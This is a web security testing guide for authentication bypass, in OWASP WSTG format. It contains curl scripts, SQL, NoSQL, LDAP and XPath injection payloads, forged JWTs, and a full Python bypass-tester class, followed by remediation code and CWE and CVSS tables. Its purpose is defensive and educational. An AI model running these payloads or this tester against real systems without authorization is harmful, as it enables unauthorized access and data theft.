# WSTG-ATHN-04: Testing for Bypassing Authentication Schema

## Test ID
WSTG-ATHN-04

## Test Name
Testing for Bypassing Authentication Schema

## High-Level Description

Authentication bypass testing examines whether an application's authentication controls can be circumvented. Attackers may exploit logic flaws, misconfigurations, or vulnerabilities to access protected resources without proper authentication. This test identifies weaknesses that allow unauthorized access by bypassing the normal authentication process.

---

## What to Check

### Bypass Techniques

- [ ] Direct page access
- [ ] Parameter manipulation
- [ ] Session prediction
- [ ] SQL injection in auth
- [ ] Forced browsing
- [ ] Authentication logic flaws
- [ ] Response manipulation

### Common Vulnerabilities

| Vulnerability | Description |
|---------------|-------------|
| Forced browsing | Direct URL access to protected pages |
| Parameter tampering | Modifying auth parameters |
| Cookie manipulation | Changing session/auth cookies |
| SQL injection | Auth bypass via SQLi |
| JWT manipulation | Token tampering |

---

## How to Test

### Step 1: Test Direct Page Access

```bash
#!/bin/bash
# Test accessing protected pages without authentication

protected_pages=(
    "/admin"
    "/dashboard"
    "/user/profile"
    "/api/users"
    "/settings"
    "/internal"
    "/management"
    "/admin/users"
)

for page in "${protected_pages[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$page")
    echo "$page: $response"

    # Should be 401 or 403, not 200
    if [ "$response" == "200" ]; then
        echo "  [VULN] Page accessible without authentication!"
    fi
done
```

### Step 2: Test Authentication Parameter Manipulation

```bash
# Test manipulating authentication-related parameters

# Test with isLoggedIn parameter
curl -s "https://target.com/dashboard?isLoggedIn=true"
curl -s "https://target.com/dashboard?authenticated=1"
curl -s "https://target.com/dashboard?auth=true"

# Test with user parameter
curl -s "https://target.com/dashboard?user=admin"
curl -s "https://target.com/dashboard?userId=1"
curl -s "https://target.com/dashboard?role=admin"

# Test with header manipulation
curl -s "https://target.com/admin" \
    -H "X-User: admin"

curl -s "https://target.com/admin" \
    -H "X-Authenticated: true"

curl -s "https://target.com/admin" \
    -H "X-Forwarded-User: admin"
```

### Step 3: Test Cookie Manipulation

```bash
# Test manipulating session/auth cookies

# Test with fake session cookie
curl -s "https://target.com/dashboard" \
    -H "Cookie: session=admin"

curl -s "https://target.com/dashboard" \
    -H "Cookie: auth=true; user=admin"

curl -s "https://target.com/dashboard" \
    -H "Cookie: isLoggedIn=1; role=administrator"

# Test with base64 encoded values
admin_b64=$(echo -n "admin" | base64)
curl -s "https://target.com/dashboard" \
    -H "Cookie: user=$admin_b64"
```

### Step 4: Test SQL Injection in Authentication

```bash
# Test SQL injection in login form

# Basic SQLi payloads
payloads=(
    "admin'--"
    "admin' OR '1'='1"
    "admin' OR '1'='1'--"
    "admin' OR '1'='1'/*"
    "' OR 1=1--"
    "' OR 1=1#"
    "admin')--"
    "' OR ''='"
)

for payload in "${payloads[@]}"; do
    response=$(curl -s -X POST "https://target.com/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$payload\",\"password\":\"anything\"}")

    # Check for successful login indicators
    if echo "$response" | grep -qi "success\|token\|dashboard"; then
        echo "[VULN] SQLi bypass with: $payload"
    fi
done
```

### Step 5: Test JWT Manipulation

```bash
# If application uses JWT

# Get a valid JWT
valid_jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature"

# Test with 'none' algorithm
# Header: {"alg":"none","typ":"JWT"}
none_jwt="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

curl -s "https://target.com/api/protected" \
    -H "Authorization: Bearer $none_jwt"

# Test with modified payload
# Change user claim from "test" to "admin"
modified_jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_signature"

curl -s "https://target.com/api/protected" \
    -H "Authorization: Bearer $modified_jwt"

# Test without signature
no_sig_jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ."

curl -s "https://target.com/api/protected" \
    -H "Authorization: Bearer $no_sig_jwt"
```

### Step 6: Test Response Manipulation

```bash
# Test if client-side checks can be bypassed

# Intercept a failed login response and check behavior
# Using Burp Suite or similar proxy:
# 1. Attempt login with wrong credentials
# 2. Intercept response
# 3. Change response from 401 to 200
# 4. Modify body to include success indicators
# 5. Check if application grants access

# This is typically done via proxy, but we can test client behavior:
curl -s "https://target.com/login" \
    -X POST \
    -d "username=admin&password=wrong" \
    -v 2>&1 | grep -i "location\|set-cookie\|redirect"
```

### Step 7: Test Alternative Authentication Methods

```bash
# Test if other authentication methods can be bypassed

# OAuth state parameter
curl -s "https://target.com/oauth/callback?code=test&state=anything"

# SAML response manipulation
curl -s "https://target.com/saml/acs" \
    -X POST \
    -d "SAMLResponse=base64_encoded_forged_response"

# API key in different locations
curl -s "https://target.com/api/protected" \
    -H "Authorization: ApiKey test"

curl -s "https://target.com/api/protected?api_key=test"

curl -s "https://target.com/api/protected" \
    -H "X-API-Key: test"
```

---

## Tools

### Authentication Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request manipulation | Intercept and modify |
| **SQLMap** | SQL injection | Auth bypass testing |
| **jwt_tool** | JWT testing | Token manipulation |

### Automation

| Tool | Description |
|------|-------------|
| **OWASP ZAP** | Automated scanning |
| **Nuclei** | Template-based testing |

---

## Example Commands/Payloads

### Authentication Bypass Payloads

```text
# SQL Injection
admin'--
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
') OR ('1'='1'--
admin'/*
" OR ""="
" OR 1=1--

# NoSQL Injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# LDAP Injection
*
admin)(|(password=*))
*)(uid=*))(|(uid=*

# XPath Injection
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
```

### Authentication Bypass Tester

```python
#!/usr/bin/env python3
import requests
import json
import base64

class AuthBypassTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []

    def test_direct_access(self, protected_urls):
        """Test direct access to protected resources"""
        print("[*] Testing direct page access...")

        for url in protected_urls:
            response = self.session.get(f"{self.base_url}{url}")

            if response.status_code == 200:
                self.results.append({
                    "test": "Direct Access",
                    "url": url,
                    "status": "VULNERABLE",
                    "details": f"Status code: {response.status_code}"
                })
            else:
                self.results.append({
                    "test": "Direct Access",
                    "url": url,
                    "status": "Protected",
                    "details": f"Status code: {response.status_code}"
                })

    def test_sql_injection(self, login_url, username_field="username", password_field="password"):
        """Test SQL injection in login"""
        print("[*] Testing SQL injection bypass...")

        sqli_payloads = [
            ("admin'--", "anything"),
            ("' OR '1'='1'--", "anything"),
            ("admin' OR '1'='1", "anything"),
            ("' OR 1=1--", "anything"),
            ("admin'/*", "anything"),
            ("' OR ''='", "' OR ''='"),
        ]

        for username, password in sqli_payloads:
            response = self.session.post(
                f"{self.base_url}{login_url}",
                data={username_field: username, password_field: password}
            )

            # Check for success indicators
            if response.status_code == 200 and any(
                x in response.text.lower()
                for x in ["dashboard", "welcome", "logout", "success"]
            ):
                self.results.append({
                    "test": "SQL Injection",
                    "payload": f"{username}:{password}",
                    "status": "VULNERABLE"
                })
                return

    def test_parameter_manipulation(self, protected_url):
        """Test authentication parameter manipulation"""
        print("[*] Testing parameter manipulation...")

        bypass_params = [
            {"isLoggedIn": "true"},
            {"authenticated": "1"},
            {"auth": "true"},
            {"user": "admin"},
            {"role": "admin"},
            {"admin": "true"},
        ]

        bypass_headers = [
            {"X-User": "admin"},
            {"X-Authenticated": "true"},
            {"X-Auth-User": "admin"},
            {"X-Forwarded-User": "admin"},
        ]

        for params in bypass_params:
            response = self.session.get(
                f"{self.base_url}{protected_url}",
                params=params
            )

            if response.status_code == 200:
                self.results.append({
                    "test": "Parameter Manipulation",
                    "params": params,
                    "status": "POTENTIALLY VULNERABLE"
                })

        for headers in bypass_headers:
            response = self.session.get(
                f"{self.base_url}{protected_url}",
                headers=headers
            )

            if response.status_code == 200:
                self.results.append({
                    "test": "Header Manipulation",
                    "headers": headers,
                    "status": "POTENTIALLY VULNERABLE"
                })

    def test_jwt_bypass(self, protected_url, valid_jwt=None):
        """Test JWT authentication bypass"""
        print("[*] Testing JWT bypass...")

        # None algorithm
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip('=')

        admin_payload = base64.urlsafe_b64encode(
            json.dumps({"user": "admin", "role": "admin"}).encode()
        ).decode().rstrip('=')

        none_jwt = f"{none_header}.{admin_payload}."

        response = self.session.get(
            f"{self.base_url}{protected_url}",
            headers={"Authorization": f"Bearer {none_jwt}"}
        )

        if response.status_code == 200:
            self.results.append({
                "test": "JWT None Algorithm",
                "status": "VULNERABLE"
            })

    def generate_report(self):
        """Generate test report"""
        print("\n" + "=" * 50)
        print("AUTHENTICATION BYPASS TEST REPORT")
        print("=" * 50 + "\n")

        vulnerable = [r for r in self.results if "VULNERABLE" in r.get("status", "")]

        print(f"Total tests: {len(self.results)}")
        print(f"Potential vulnerabilities: {len(vulnerable)}\n")

        if vulnerable:
            print("VULNERABILITIES FOUND:")
            for v in vulnerable:
                print(f"\n  Test: {v['test']}")
                for key, value in v.items():
                    if key != "test":
                        print(f"    {key}: {value}")

# Usage
tester = AuthBypassTester("https://target.com")
tester.test_direct_access(["/admin", "/dashboard", "/api/users"])
tester.test_sql_injection("/login")
tester.test_parameter_manipulation("/dashboard")
tester.test_jwt_bypass("/api/protected")
tester.generate_report()
```

---

## Remediation Guide

### 1. Implement Proper Access Control

```python
from functools import wraps
from flask import g, redirect, url_for, request

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

def is_authenticated():
    """Server-side authentication check"""
    # Check session server-side
    session_id = request.cookies.get('session_id')

    if not session_id:
        return False

    # Validate session in database/cache
    session = Session.query.filter_by(
        id=session_id,
        is_valid=True
    ).first()

    if not session or session.is_expired():
        return False

    g.current_user = session.user
    return True

@app.route('/admin')
@login_required
def admin():
    return render_template('admin.html')
```

### 2. Prevent SQL Injection

```python
from sqlalchemy import text

def authenticate(username, password):
    """Secure authentication with parameterized queries"""

    # Never use string concatenation
    # BAD: f"SELECT * FROM users WHERE username='{username}'"

    # GOOD: Use parameterized queries
    user = User.query.filter_by(username=username).first()

    if user and user.check_password(password):
        return user

    return None
```

### 3. Secure JWT Implementation

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = os.environ.get('JWT_SECRET_KEY')
ALGORITHM = 'HS256'  # Never accept 'none'

def create_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=1),
        'iat': datetime.utcnow()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token):
    try:
        # Specify allowed algorithms explicitly
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM]  # Only allow HS256
        )
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
```

### 4. Server-Side Authorization

```python
@app.before_request
def check_authorization():
    """Centralized authorization check"""

    # Public endpoints
    public_paths = ['/login', '/register', '/public', '/static']

    if any(request.path.startswith(p) for p in public_paths):
        return

    # Check authentication
    if not is_authenticated():
        return jsonify({'error': 'Authentication required'}), 401

    # Check authorization
    if not is_authorized(g.current_user, request.path, request.method):
        return jsonify({'error': 'Access denied'}), 403
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Complete auth bypass (SQLi) | 9.8 | Critical |
| Direct access to admin pages | 9.8 | Critical |
| JWT none algorithm accepted | 9.8 | Critical |
| Parameter-based bypass | 8.8 | High |
| Cookie manipulation bypass | 8.8 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-287** | Improper Authentication | Auth bypass |
| **CWE-89** | SQL Injection | SQLi in auth |
| **CWE-639** | Authorization Bypass | Access control bypass |
| **CWE-347** | Improper Verification of Cryptographic Signature | JWT bypass |

---

## References

- [OWASP WSTG - Testing for Bypassing Authentication Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)
- [OWASP Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)

---

## Checklist

```
[ ] Direct page access tested
[ ] Parameter manipulation tested
[ ] Cookie manipulation tested
[ ] SQL injection in login tested
[ ] NoSQL injection tested
[ ] JWT manipulation tested
[ ] Response manipulation tested
[ ] Alternative auth methods tested
[ ] Session handling tested
[ ] Authorization bypass tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
